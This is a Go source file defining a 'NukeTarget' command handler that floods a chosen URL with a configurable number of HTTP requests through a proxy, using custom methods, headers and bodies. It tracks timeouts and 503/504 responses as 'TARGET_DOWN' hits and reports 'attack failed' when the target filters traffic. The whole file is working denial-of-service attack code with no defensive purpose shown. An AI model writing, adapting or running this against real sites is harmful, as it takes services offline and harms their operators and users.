package handler

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"syscall"

	"github.com/andriiyaremenko/mg/client"
	"github.com/andriiyaremenko/mg/dto"
	"github.com/andriiyaremenko/tinycqs/command"
	"github.com/pkg/errors"
)

func NukeTarget(amountRequests int64) command.Handler {
	return &command.BaseHandler{
		Type: "NUKE_TARGET",
		HandleFunc: func(ctx context.Context, w command.EventWriter, e command.Event) {
			defer w.Done()

			select {
			case <-ctx.Done():
				return
			default:
			}

			p := e.Payload()
			target := new(dto.Target)
			if err := json.Unmarshal(p, target); err != nil {
				w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target record")))
				return
			}

			client, err := client.WithProxy(target.Proxy)
			if err != nil {
				w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target proxy record")))
				return
			}

			hits := 0
			for i := amountRequests; i > 0; i-- {
				select {
				case <-ctx.Done():
					return
				default:
				}

				var body io.Reader = nil

				if target.Data != nil {
					body = bytes.NewReader(target.Data)
				}

				req, err := http.NewRequest(target.Method, target.URL, body)
				if err != nil {
					w.Write(command.NewErrEvent(e, err))
					return
				}

				for _, header := range target.Headers {
					req.Header.Add(header[0], header[1])
				}

				resp, err := client.Do(req)

				if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
					hits++

					w.Write(command.E{
						Type: "TARGET_DOWN",
						P:    p,
					})

					if hits >= 5 {
						return
					}

					continue
				}

				if errors.Is(err, io.EOF) || errors.Is(err, syscall.ECONNRESET) {
					w.Write(
						command.NewErrEvent(
							e,
							errors.Wrap(err, "attack failed, target filters traffic"),
						),
					)

					return
				}

				if err != nil {
					w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))

					continue
				}

				resp.Body.Close()

				if resp.StatusCode == http.StatusServiceUnavailable ||
					resp.StatusCode == http.StatusGatewayTimeout {
					hits++

					w.Write(command.E{
						Type: "TARGET_DOWN",
						P:    p,
					})

					if hits >= 5 {
						return
					}

					continue
				}

				if resp.StatusCode < 300 {
					hits = 0

					w.Write(command.E{
						Type: "TARGET_ALIVE",
						P:    p,
					})

					continue
				}

				hits = 0
				targetErr := dto.TargetError{
					Target:  *target,
					ErrCode: resp.StatusCode,
				}

				b, err := json.Marshal(targetErr)
				if err != nil {
					w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target error record")))

					continue
				}

				w.Write(command.E{
					Type: "TARGET_ERROR",
					P:    b,
				})
			}
		},
	}
}
